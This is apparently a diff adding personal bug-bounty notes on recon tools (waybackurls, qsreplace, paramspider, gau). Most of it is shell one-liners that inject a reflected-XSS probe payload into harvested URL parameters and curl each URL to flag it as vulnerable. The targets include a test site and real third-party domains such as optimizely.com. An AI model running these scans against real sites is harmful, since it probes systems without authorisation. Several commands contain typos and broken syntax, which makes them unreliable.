@@ -1,0 +1,58 @@
+waybackurls tips
+
+>> qsreplace github/tomnomnom 
+>> all the tools installing in /bin directory
+>> cd /bin 
+
+ how to perform waybackurls
+
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace FUZZ
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace FUZZHACK
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace FUZZHACK
+
+ # waybackurls testphp.vulnweb.com	| tee testphp1.txt | qsreplace '"><script>confirm(1)</script>' | tee combinedfuzz.json &&  cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot vulnerable\n"done
+
+>> paramspider tool
+>> devanshbatham/paramspider ->github
+ tool usage: 
+
+ -> python3 paramspider.py --domain example.com --output o example.txt
+ -> python3 paramspider.py --domain example.com --output o example.txt --level high
+ -> python3 paramspider.py --domain example.com --output o example.txt --level high --exclude woff,css,js,png,svg,php,jpg
+
+ -> python3 paramspider.py -d orientalbirdimages.org | tee yy.json | qsplace '"><script>confirm<script>' | while read host do ; do curl --silent -- path -as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
+
+ -> python3 paramspider.py --domain example.com --placeholder fuzzz
+ > payloads for seclists or payloadallthings
+
+-> python3 paramspider.py -d optimizely.com --subs false
+
+-> python3 paramspider.py -d optimizely.com --subs false --placeholder '"><script>confirm<script>' > optimizely.txt | while read host do ; do curl --silent -- path -as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n"; done
+
+-> 
+hunt to live domains
+
+step1 
+
+python3 paramspider.py -d optimizely.com --subs false
+
+step2
+python3 paramspider.py -d optimizely.com
+
+step3
+python3 paramspider.py -d optimizely.com --subs false > optimizely.txt
+
+step4
+cat optimizely.txt
+
+step5
+python3 paramspider.py -d optimizely.com --subs false --placeholder '"/><script>confirm(1)</script>' > optimizely.txt | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
+
+toolname -gau
+github.com/lc/gau
+gau -version
+gau apple.com -subs -o applesubs.txt
+
+
+
